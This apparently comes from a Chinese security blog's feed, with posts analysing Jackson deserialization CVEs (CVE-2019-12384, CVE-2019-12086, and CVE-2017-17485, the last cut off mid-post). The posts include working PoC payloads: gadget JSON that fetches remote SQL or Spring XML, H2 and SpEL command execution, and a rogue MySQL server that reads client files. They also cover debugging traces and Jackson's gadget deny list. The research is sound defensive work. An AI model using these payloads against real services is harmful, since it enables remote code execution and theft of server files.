class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line">        String payload = <span class="string">"[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", &#123;\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'\"&#125;]"</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object object = mapper.readValue(payload, Object.class);</span><br><span class="line">            <span class="comment">// 反序列化之后还需要进行序列化操作才能触发！</span></span><br><span class="line">            String s = mapper.writeValueAsString(object);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，反序列化之后需要调用ObjectMapper.writeValueAsString()即进行序列化操作才能成功触发漏洞，这就是该CVE的鸡肋之处。</p><p>运行后，目标服务端接收到GET方式请求/inject.sql即成功：</p><p><img src="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/1.png" alt=""></p><p>PoC中的JSON实际上是在H2内存数据库初始化的时候执行RUNSCRIPT指令，从指定的URL中加载执行SQL脚本。而由于刚才的Demo中Web服务未放置该SQL脚本因为没有执行，下面来看看怎么实现漏洞利用。</p><p>在Web服务端编写inject.sql，根据H2的用户可自定义函数的功能来实现，第一部分是<code>CREATE ALIAS</code>命令用来自定义shellexec()函数的内容，第二部分是<code>call</code>SQL命令，用来调用前面自定义的函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">ALIAS</span> SHELLEXEC <span class="keyword">AS</span> $$ <span class="built_in">void</span> shellexec(<span class="keyword">String</span> cmd) throws java.io.IOException &#123;</span><br><span class="line"><span class="keyword">String</span>[] command = &#123;<span class="string">"cmd"</span>, <span class="string">"/c"</span>, cmd&#125;;</span><br><span class="line">Runtime.getRuntime().exec(command);</span><br><span class="line">&#125;</span><br><span class="line">$$;</span><br><span class="line"><span class="keyword">CALL</span> SHELLEXEC(<span class="string">'calc'</span>)</span><br></pre></td></tr></table></figure><p>再次运行即可成功弹计算器：</p><p><img src="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/2.png" alt=""></p><p>我们可以再优化一下。我们看到payload中，url键对应的值其实就是一条SQL命令<code>jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://localhost:8000/inject.sql&#39;</code>，因此，我们可以直接将相应的URL部分替换为其他SQL命令，使用文件存储方式先定义一个命令执行的函数，注意代码中的分号需要用反斜杠转义一下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>, &#123;<span class="attr">"url"</span>:<span class="string">"jdbc:h2:file:~/.h2/mi1k7ea;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException &#123; Runtime.getRuntime().exec(cmd)\\; &#125;$$;"</span>&#125;]</span><br></pre></td></tr></table></figure><p>这里jdbc:h2:file会在本地Users目录中生成指定的数据库文件即C:/Users/xx/.h2/mi1k7ea.mv.db，下次可以直接调用该文件进行操作。</p><p>接着同样使用文件存储模式，执行CALL命令调用刚刚自定义的函数即可时效内任意代码执行：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>, &#123;<span class="attr">"url"</span>:<span class="string">"jdbc:h2:file:~/.h2/mi1k7ea;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CALL SHELLEXEC('calc');"</span>&#125;]</span><br></pre></td></tr></table></figure><p><img src="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/3.png" alt=""></p><h2 id="0x05-调试分析"><a href="#0x05-调试分析" class="headerlink" title="0x05 调试分析"></a>0x05 调试分析</h2><p>我们在ch.qos.logback.core.db.DriverManagerConnectionSource类上的所有getter方法和setter方法上打上断点，然后调试发现：</p><p>如果在Jackson反序列化之后不调用ObjectMapper.writeValueAsString()，则只会调用DriverManagerConnectionSource类的setUrl()函数；</p><p>如果在Jackson反序列化之后调用ObjectMapper.writeValueAsString()，则在调用DriverManagerConnectionSource类的setUrl()函数之后再调用getDriverClass()、getUrl()、getConnection()；</p><p>接着在<code>mapper.writeValueAsString(object);</code>处打上断点重新调试。</p><p>在Jackson序列化的过程中，会通过调用getter方法来获取对象的属性值，会循环调用BeanPropertyWriter.serializeAsField()函数，其中通过反射机制来调用要序列化的对象所属类的getter方法：</p><p><img src="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/4.png" alt=""></p><p>在循环调用 函数的时候，会先后调用getDriverClass()、getUrl()、getConnection()等类的getter方法。</p><p>在最后调用getConnection()函数中，调用了DriverManager.getConnection()函数来和H2数据库进行连接交互，并且由于url参数我们外部可控，因此就能利用H2用户可自定义函数的特性来实现RCE：</p><p><img src="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/5.png" alt=""></p><h2 id="0x06-补丁分析"><a href="#0x06-补丁分析" class="headerlink" title="0x06 补丁分析"></a>0x06 补丁分析</h2><p>Jackson在2.9.9.1版本中添加了ch.qos.logback.core.db.DriverManagerConnectionSource类的黑名单，具体的可在jackson-databind-2.9.9.1-sources.jar!/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java中看到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [databind#2334]: logback-core (2.9.9.1)</span></span><br><span class="line">s.add(<span class="string">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>);</span><br></pre></td></tr></table></figure><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html" target="_blank" rel="noopener">Jackson gadgets - Anatomy of a vulnerability</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）</title>
    <link href="https://www.mi1k7ea.com/2019/11/19/Jackson%E7%B3%BB%E5%88%97%E5%9B%9B%E2%80%94%E2%80%94CVE-2019-12086%EF%BC%88%E5%9F%BA%E4%BA%8EMiniAdmin%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/</id>
    <published>2019-11-19T13:04:08.000Z</published>
    <updated>2019-11-21T16:06:26.681Z</updated>
    
    <content type="html"><![CDATA[<p>该CVE是基于MiniAdmin的利用链的，和以往反序列化执行命令的漏洞不一样，本次的反序列化读取任意文件内容，如果ClassPath中有com.mysql.cj.jdbc.admin.MiniAdmin（存在MySQL的JDBC驱动中）这个类，那么Java应用所在的服务器上的文件，就可能被任意读取并传送到恶意的MySQL Server。</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p>Jackson 2.x系列 &lt; 2.9.9</p><h2 id="0x02-限制"><a href="#0x02-限制" class="headerlink" title="0x02 限制"></a>0x02 限制</h2><p>目标环境中需存在8.0.14版本以下的MySQL驱动，即mysql-connector-java版本 &lt; 8.0.14。</p><p>更具体地说，mysql-connector-java版本应为 6.0.3-8.0.15 之间才能成功触发。</p><h2 id="0x03-利用到的MySQL特性问题"><a href="#0x03-利用到的MySQL特性问题" class="headerlink" title="0x03 利用到的MySQL特性问题"></a>0x03 利用到的MySQL特性问题</h2><h3 id="LOAD-DATA-LOCAL"><a href="#LOAD-DATA-LOCAL" class="headerlink" title="LOAD DATA LOCAL"></a>LOAD DATA LOCAL</h3><p> 具体可参考：<a href="https://dev.mysql.com/doc/refman/5.7/en/load-data-local.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/load-data-local.html</a></p><p>下面简单说下。</p><p>MySQL支持使用LOAD DATA LOCAL INFILE语法，即可将客户端本地的文件中的数据insert到MySQL的某张表中。</p><p>协议的工作过程大致如下：</p><ol><li>用户在客户端输入：load data local file “/data.txt” into table test；</li><li>客户端-&gt;服务端：我想把我本地的/data.txt文件插入到test表中；</li><li>服务端-&gt;客户端：把你本地的/data.txt文件发给我；</li><li>客户端-&gt;服务端：/data.txt文件的内容；</li></ol><p>问题在于，客户端发送哪个文件的内容，取决于第三步即服务端响应的想要的哪个文件，如果服务端是个恶意的MySQL，那么它可以读取客户端的任意文件内容，比如读取/etc/passwd：</p><ol><li>用户在客户端输入：load data local file “/data.txt” into table test；</li><li>客户端-&gt;服务端：我想把我本地的/data.txt文件插入到test表中；</li><li>服务端-&gt;客户端：把你本地的/etc/passwd文件发给我；</li><li>客户端-&gt;服务端：/etc/passwd文件的内容；</li></ol><p>而且，在大部分客户端（比如MySQL Connect/J）的实现里，第一步和第二部并非是必须的，客户端发送任意查询给服务端，服务端都可以返回文件发送的请求。而大部分客户端在建立连接之后，都会有一些查询服务器配置之类的查询，所以使用这些客户端，只要创建了到恶意MySQL服务器的连接，那么客户端所在的服务器上的所有文件都可能泄露。</p><h3 id="allowLoadLocalInfile"><a href="#allowLoadLocalInfile" class="headerlink" title="allowLoadLocalInfile"></a>allowLoadLocalInfile</h3><p>allowLoadLocalInfile是MySQL的JDBC驱动的一个创建连接的配置项，用来控制是否允许从本地读取文件，默认值为True。</p><h2 id="0x04-复现利用"><a href="#0x04-复现利用" class="headerlink" title="0x04 复现利用"></a>0x04 复现利用</h2><p>PoC.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line">        String payload = <span class="string">"[\"com.mysql.cj.jdbc.admin.MiniAdmin\",\"jdbc:mysql://192.168.10.128:3307/test\"]"</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mapper.readValue(payload, Object.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下载恶意的MySQL服务器脚本，并运行在Linux中，同时指定读取目标MySQL客户端的哪个文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rogue_mysql_server.py <span class="string">"C:/Windows/win.ini"</span></span><br></pre></td></tr></table></figure><p>运行后，可以在MySQL服务端的mysql.log中读取到客户端的文件内容：</p><p><img src="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/1.png" alt=""></p><h2 id="0x05-调试分析"><a href="#0x05-调试分析" class="headerlink" title="0x05 调试分析"></a>0x05 调试分析</h2><p>在<code>mapper.readValue(payload, Object.class);</code>处打下断点进行调试。同时，我们分析MiniAdmin类发现，它并没有getter方法和setter方法，只有构造函数，也就是说该类的漏洞在于它的构造函数中，直接在它的构造函数处打下断点即可。</p><p>前面的函数调用过程和之前的没啥区别，直至调用newInstance()函数创建新的MiniAdmin类实例时，会调用到MiniAdmin类的构造函数，而该函数中则是直接调用了Jdbc的connect()方法、会直接去连接jdbcUrl指向的数据库地址：</p><p><img src="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/2.png" alt=""></p><p>利用链：newInstance()-&gt;MiniAdmin()-&gt;Driver.connect()</p><p>函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:95, MiniAdmin (com.mysql.cj.jdbc.admin)</span><br><span class="line">&lt;init&gt;:79, MiniAdmin (com.mysql.cj.jdbc.admin)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">call1:129, AnnotatedConstructor (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">createFromString:299, StdValueInstantiator (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserializeFromString:1204, BeanDeserializerBase (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserializeOther:144, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:135, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeTypedFromAny:68, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeWithType:554, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserialize:63, TypeWrappedDeserializer (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">main:19, PoC</span><br></pre></td></tr></table></figure><h2 id="0x06-为何需要MySQL-Connector-J-gt-6-0-3"><a href="#0x06-为何需要MySQL-Connector-J-gt-6-0-3" class="headerlink" title="0x06 为何需要MySQL Connector/J &gt;= 6.0.3"></a>0x06 为何需要MySQL Connector/J &gt;= 6.0.3</h2><p>我们在mysql-connector-java-6.0.3-sources.jar!/com/mysql/cj/core/conf/PropertyDefinitions.java中看到，在其静态代码块中对maxAllowedPacket设置项设置为65535，即默认允许最大的包大小为65535：</p><p><img src="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/3.png" alt=""></p><p>而在中，我们发现其静态代码块中对maxAllowedPacket设置项设置为-1，也就是说默认不让你发包，也就不存在漏洞了：</p><p><img src="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/4.png" alt=""></p><h2 id="0x07-补丁分析"><a href="#0x07-补丁分析" class="headerlink" title="0x07 补丁分析"></a>0x07 补丁分析</h2><h3 id="MySQL-Connector-J的修复"><a href="#MySQL-Connector-J的修复" class="headerlink" title="MySQL Connector/J的修复"></a>MySQL Connector/J的修复</h3><p>MySQL Connector/J从8.0.15版本开始将allowLoadLocalInfile默认值设置为false。</p><p><a href="https://dev.mysql.com/doc/relnotes/connector-j/8.0/en/news-8-0-15.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/relnotes/connector-j/8.0/en/news-8-0-15.html</a></p><h3 id="Jackson的修复"><a href="#Jackson的修复" class="headerlink" title="Jackson的修复"></a>Jackson的修复</h3><p>从2.9.9版本开始，Jackson将”com.mysql.cj.jdbc.admin.MiniAdmin”加入到反序列化黑名单中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        Set&lt;String&gt; s = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">        <span class="comment">// Courtesy of [https://github.com/kantega/notsoserial]:</span></span><br><span class="line">        <span class="comment">// (and wrt [databind#1599])</span></span><br><span class="line">        s.add(<span class="string">"org.apache.commons.collections.functors.InvokerTransformer"</span>);</span><br><span class="line">        s.add(<span class="string">"org.apache.commons.collections.functors.InstantiateTransformer"</span>);</span><br><span class="line">        s.add(<span class="string">"org.apache.commons.collections4.functors.InvokerTransformer"</span>);</span><br><span class="line">        s.add(<span class="string">"org.apache.commons.collections4.functors.InstantiateTransformer"</span>);</span><br><span class="line">        s.add(<span class="string">"org.codehaus.groovy.runtime.ConvertedClosure"</span>);</span><br><span class="line">        s.add(<span class="string">"org.codehaus.groovy.runtime.MethodClosure"</span>);</span><br><span class="line">        s.add(<span class="string">"org.springframework.beans.factory.ObjectFactory"</span>);</span><br><span class="line">        s.add(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">        s.add(<span class="string">"org.apache.xalan.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">        <span class="comment">// [databind#1680]: may or may not be problem, take no chance</span></span><br><span class="line">        s.add(<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>);</span><br><span class="line">        <span class="comment">// [databind#1737]; JDK provided</span></span><br><span class="line">        s.add(<span class="string">"java.util.logging.FileHandler"</span>);</span><br><span class="line">        s.add(<span class="string">"java.rmi.server.UnicastRemoteObject"</span>);</span><br><span class="line">        <span class="comment">// [databind#1737]; 3rd party</span></span><br><span class="line"><span class="comment">//s.add("org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor"); // deprecated by [databind#1855]</span></span><br><span class="line">        s.add(<span class="string">"org.springframework.beans.factory.config.PropertyPathFactoryBean"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// s.add("com.mchange.v2.c3p0.JndiRefForwardingDataSource"); // deprecated by [databind#1931]</span></span><br><span class="line"><span class="comment">// s.add("com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"); // - "" -</span></span><br><span class="line">        <span class="comment">// [databind#1855]: more 3rd party</span></span><br><span class="line">        s.add(<span class="string">"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"</span>);</span><br><span class="line">        s.add(<span class="string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span>);</span><br><span class="line">        <span class="comment">// [databind#1899]: more 3rd party</span></span><br><span class="line">        s.add(<span class="string">"org.hibernate.jmx.StatisticsService"</span>);</span><br><span class="line">        s.add(<span class="string">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span>);</span><br><span class="line">        <span class="comment">// [databind#2032]: more 3rd party; data exfiltration via xml parsed ext entities</span></span><br><span class="line">        s.add(<span class="string">"org.apache.ibatis.parsing.XPathParser"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [databind#2052]: Jodd-db, with jndi/ldap lookup</span></span><br><span class="line">        s.add(<span class="string">"jodd.db.connection.DataSourceConnectionProvider"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [databind#2058]: Oracle JDBC driver, with jndi/ldap lookup</span></span><br><span class="line">        s.add(<span class="string">"oracle.jdbc.connector.OracleManagedConnectionFactory"</span>);</span><br><span class="line">        s.add(<span class="string">"oracle.jdbc.rowset.OracleJDBCRowSet"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [databind#2097]: some 3rd party, one JDK-bundled</span></span><br><span class="line">        s.add(<span class="string">"org.slf4j.ext.EventData"</span>);</span><br><span class="line">        s.add(<span class="string">"flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor"</span>);</span><br><span class="line">        s.add(<span class="string">"com.sun.deploy.security.ruleset.DRSHelper"</span>);</span><br><span class="line">        s.add(<span class="string">"org.apache.axis2.jaxws.spi.handler.HandlerResolverImpl"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [databind#2186]: yet more 3rd party gadgets</span></span><br><span class="line">        s.add(<span class="string">"org.jboss.util.propertyeditor.DocumentEditor"</span>);</span><br><span class="line">        s.add(<span class="string">"org.apache.openjpa.ee.RegistryManagedRuntime"</span>);</span><br><span class="line">        s.add(<span class="string">"org.apache.openjpa.ee.JNDIManagedRuntime"</span>);</span><br><span class="line">        s.add(<span class="string">"org.apache.axis2.transport.jms.JMSOutTransportInfo"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [databind#2326] (2.9.9): one more 3rd party gadget</span></span><br><span class="line">        s.add(<span class="string">"com.mysql.cj.jdbc.admin.MiniAdmin"</span>);</span><br><span class="line"></span><br><span class="line">        DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h2><p><a href="https://www.cnblogs.com/xinzhao/p/11005419.html" target="_blank" rel="noopener">分析Jackson的安全漏洞CVE-2019-12086</a></p><p><a href="https://github.com/jas502n/CVE-2019-12086-jackson-databind-file-read" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-12086-jackson-databind-file-read</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</title>
    <link href="https://www.mi1k7ea.com/2019/11/17/Jackson%E7%B3%BB%E5%88%97%E4%B8%89%E2%80%94CVE-2017-1748%EF%BC%88%E5%9F%BA%E4%BA%8EClassPathXmlApplicationContext%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/</id>
    <published>2019-11-17T05:02:59.000Z</published>
    <updated>2019-11-26T14:06:49.410Z</updated>
    
    <content type="html"><![CDATA[<p>本次Jackson反序列化漏洞是基于org.springframework.context.support.ClassPathXmlApplicationContext的利用链的。在开启enableDefaultTyping()或使用有问题的@JsonTypeInfo注解的前提下，可以通过jackson-databind来滥用Spring的SpEL表达式注入漏洞来触发Jackson反序列化漏洞的，从而达到任意命令执行的效果。</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p>Jackson 2.7系列 &lt; 2.7.9.2</p><p>Jackson 2.8系列 &lt; 2.8.11</p><p>Jackson 2.9系列 &lt; 2.9.4</p><h2 id="0x02-限制"><a href="#0x02-限制" class="headerlink" title="0x02 限制"></a>0x02 限制</h2><p>不受JDK限制，可直接在JDK1.8上运行。</p><p>需要服务端环境存在额外的jar包，以我本地环境为例：jackson-annotations-2.7.9，jackson-core-2.7.9，jackson-databind-2.7.9，spring-beans-5.0.2.RELEASE，spring-context-5.0.2.RELEASE，spring-core-5.0.2.RELEASE，spring-expression-5.0.2.RELEASE，commons-logging-1.2。</p><h2 id="0x03-复现利用"><a href="#0x03-复现利用" class="headerlink" title="0x03 复现利用"></a>0x03 复现利用</h2><p>PoC.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line">        <span class="comment">//CVE-2017-17485</span></span><br><span class="line">        String payload = <span class="string">"[\"org.springframework.context.support.ClassPathXmlApplicationContext\", \"http://127.0.0.1/spel.xml\"]"</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mapper.readValue(payload, Object.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>spel.xml，放置在第三方Web服务中，看到id为pb的bean标签，指定了类为java.lang.ProcessBuilder，在其中有两个子标签，constructor-arg标签设置参数值为具体的命令，property标签：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"pb"</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">"calc.exe"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"whatever"</span> <span class="attr">value</span>=<span class="string">"#&#123; pb.start() &#125;"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行即可成功触发：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/1.png" alt=""></p><h2 id="0x04-调试分析"><a href="#0x04-调试分析" class="headerlink" title="0x04 调试分析"></a>0x04 调试分析</h2><p>本次的利用链是基于org.springframework.context.support.ClassPathXmlApplicationContext类，利用的原理就是SpEL表达式注入漏洞。</p><p>我们在<code>mapper.readValue(payload, Object.class);</code>上打上断点开始调试。</p><p>调试到UntypedObjectDeserializer.deserializeWithType()函数，其中会调用AsArrayTypeDeserializer.deserializeTypedFromAny()函数来解析我们数组形式的JSON内容：</p><p><img src="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/2.png" 